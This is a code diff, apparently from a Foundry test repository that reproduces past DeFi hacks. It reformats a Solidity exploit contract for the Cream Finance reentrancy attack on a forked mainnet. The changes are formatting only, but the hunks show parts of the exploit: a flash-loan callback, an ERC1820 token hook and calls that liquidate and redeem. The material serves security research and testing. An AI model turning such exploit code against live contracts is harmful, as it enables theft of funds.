@@ -38,7 +38,8 @@ interface IUnitroller {
 }
 
 contract Exploit_CreamFinance is TestHarness, TokenBalanceTracker {
-    IERC1820Registry internal interfaceRegistry = IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);
+    IERC1820Registry internal interfaceRegistry =
+        IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);
     IUniswapV2Pair internal wiseWethPair = IUniswapV2Pair(0x21b8065d10f73EE2e260e5B47D3344d3Ced7596E);
 
     IUnitroller internal comptroller = IUnitroller(0x3d5BC3c8d13dcB8bF317092d84783c2697AE9258);
@@ -52,7 +53,7 @@ contract Exploit_CreamFinance is TestHarness, TokenBalanceTracker {
         0xfa352d6368bbc643bcf9d528ffaba5dd3e826137bc42f935045c6c227bd4c72a;
 
     function setUp() external {
-        cheat.createSelectFork(vm.envString("RPC_URL"), 13125070); // fork mainnet at block 13125070
+        cheat.createSelectFork(vm.envString("RPC_URL"), 13_125_070); // fork mainnet at block 13125070
 
         cheat.deal(address(this), 0);
 
@@ -95,7 +96,13 @@ contract Exploit_CreamFinance is TestHarness, TokenBalanceTracker {
         assertGe(balanceAfterAMP, balanceBeforeAMP);
     }
 
-    function uniswapV2Call(address sender, uint256, /* /wiseLoanAmt */ uint256 wethLoanAmt, bytes calldata)
+    function uniswapV2Call(
+        address sender,
+        uint256,
+        /* /wiseLoanAmt */
+        uint256 wethLoanAmt,
+        bytes calldata
+    )
         external
     {
         require(msg.sender == address(wiseWethPair), "Only callable by pair");
@@ -173,7 +180,8 @@ contract Exploit_CreamFinance is TestHarness, TokenBalanceTracker {
 }
 
 contract ExploiterMinion {
-    IERC1820Registry internal interfaceRegistry = IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);
+    IERC1820Registry internal interfaceRegistry =
+        IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);
     bytes32 constant TOKENS_RECIPIENT_INTERFACE_HASH =
         0xfa352d6368bbc643bcf9d528ffaba5dd3e826137bc42f935045c6c227bd4c72a;
 
@@ -201,7 +209,7 @@ contract ExploiterMinion {
     function liquidateAMPBorrow() external onlyCommander {
         amp.approve(address(crAmp), type(uint256).max);
         crAmp.liquidateBorrow(commanderContract, amp.balanceOf(address(this)), address(crEth)); // Liquidate
-            // the other half
+        // the other half
     }
 
     function redeemLiquidationPrize() external onlyCommander {
@@ -221,8 +229,7 @@ contract ExploiterMinion {
     }
 
     function tokensReceived(bytes4, bytes32, address, address, address, uint256, bytes memory, bytes memory)
-        external
-    {}
+        external {}
 
     receive() external payable {}
 }
